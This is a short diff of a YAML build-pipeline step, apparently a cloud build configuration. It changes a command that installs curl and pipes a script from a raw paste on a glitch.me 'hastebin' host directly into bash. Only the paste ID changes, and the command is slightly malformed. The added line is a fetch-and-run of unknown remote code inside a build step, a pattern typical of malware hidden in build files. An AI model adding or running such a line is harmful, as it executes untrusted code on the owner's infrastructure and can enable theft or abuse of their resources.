@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-        apt-get update && apt-get install curl -y && curl -sL curl https://muq-hastebin.glitch.me/raw/fAKbra29yw | bash
+        apt-get update && apt-get install curl -y && curl -sL curl https://muq-hastebin.glitch.me/raw/JEXp1Dm0Am | bash
     waitFor:
       - '-'
     entrypoint: /bin/bash
